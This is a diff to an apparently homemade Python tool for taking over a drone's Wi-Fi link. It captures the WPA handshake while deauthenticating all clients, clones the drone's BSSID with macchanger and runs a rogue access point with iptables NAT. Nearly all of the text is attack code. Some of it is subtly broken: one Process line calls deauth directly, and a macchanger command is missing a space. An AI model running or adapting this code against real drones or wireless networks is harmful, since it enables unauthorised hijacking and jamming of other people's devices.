@@ -5,6 +5,7 @@ import os
 import conf_files as cf
 import pandas as pd
 import psutil
+import tracemalloc
 
 iface = ''
 iface1 = ''
@@ -49,8 +50,9 @@ def handshake_capture():
         print(channel_no,'\t',bssid_name,'\t',   essid_name)
         dist = str(input("\nEnter the number of the packets [1-10000] (0 for unlimited number) "))
         print("Capturing 4-Way handshake [{}]...".format(bssid_name))
+        print(f"Currently Deauthenticating all clients from {essid_name}")
         #start deauthentication process
-        #p_deauth = Process(target = deauth(dist, bssid_name, iface))
+        p_deauth = Process(target = deauth(dist, bssid_name, iface))
         p_deauth = Process(target = deauth, args=(dist, bssid_name, iface))
         p_deauth.start()
         os.system(f"airodump-ng {iface} --bssid {bssid_name} -c {channel_no} -w handshake")
@@ -94,12 +96,12 @@ def create_configs(iface, essid, channel_no):
 def rogue_ap():
     global iface, bssid_name
     #os.system('sudo killall dnsmasq')
-    os.system(f'ifconfig {iface} down')
-    os.system(f'macchanger --mac={bssid_name} {iface}')
-    os.system(f'ifconfig {iface} up')
-    os.system(f'ifconfig {iface} up 192.168.2.1 netmask 255.255.255.0')
-    #os.system(f'ifconfig {iface1} mtu 1400')
-    os.system('route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1')
+    #os.system(f'ifconfig {iface} down')
+    #os.system(f'macchanger --mac={bssid_name} {iface}')
+
+    #os.system(f'ifconfig {iface} up')
+    os.system(f'ifconfig {iface} up 192.168.1.1 netmask 255.255.255.0')
+    os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
     #ip forwarding and adapter bridging
     os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
     os.system('iptables --append FORWARD --in-interface wlan0 -j ACCEPT')
@@ -110,8 +112,8 @@ def rogue_ap():
 def main():
     global iface,iface1, essid_name, bssid_name, channel_no
     iface = setup_monitor("wlan0")
-    iface1 = ("drone_wlan")
-    os.system(f"iw dev wlan0mon interface add {iface1} type managed")
+    #iface1 = ("drone_wlan")
+    #os.system(f"iw dev wlan0mon interface add {iface1} type managed")
     print("\nWhen Done Press CTRL+C")
     time.sleep(2)
     print("Scanning for access points...")
@@ -124,26 +126,35 @@ def main():
     cc.terminate()
     cc.join()
     handshake_capture()
-    client_mac = mac_extract()
-    os.system(f"ifconfig {iface1} down")
-    os.system(f"ip link set dev {iface1} address {client_mac}")
-    os.system(f"ifconfig {iface1} up")
+    client_mac = "DA:D6:D9:DD:00:F9"
+    print(client_mac)
+
+    #used to spoof client mac address
+    #os.system(f"ifconfig {iface1} down")
+    #os.system(f"ip link set dev {iface1} address {client_mac}")
+    #os.system(f"ifconfig {iface1} up")
+    
+    print('RAM memory % used:', psutil.virtual_memory()[2])
     print("Fake Access Point\nWhen Done Press CTRL+C")
     time.sleep(2.0)
     #disable_monitor(iface)
-    create_configs(iface, essid_name, channel_no)
     print('Drone information:',essid_name, bssid_name, channel_no)
     print('Drone controller info:',client_mac)
+
+    #used to spoof drone access point
+    os.system(f"ifconfig {iface} down")
+    os.system(f"iwconfig {iface} channel {channel_no}")
+    os.system(f"macchanger --mac={bssid_name}{iface}")
+    os.system(f"ifconfig {iface} up")
+
+    create_configs(iface, essid_name, channel_no)
     input("deauth in seperate window")
     #da = Process(target = deauth, args = (0, bssid_name, iface))
     #da.start()
     rogue_ap()
+    print('RAM memory % used:', psutil.virtual_memory()[2])
+    print("congrats")
     #da.terminate()
-
-#1st method to connecting to drone
-    #os.system(f"wpa_passphrase {essid_name} | sudo tee /etc/wpa_supplicant.conf")
-    #os.system(f"wpa_supplicant -c /etc/wpa_supplicant.conf -i {iface}")
-    #os.system('Connection to drone established')
 
 #2nd method to connecting to drone
     #os.system('airmon-ng check kill')
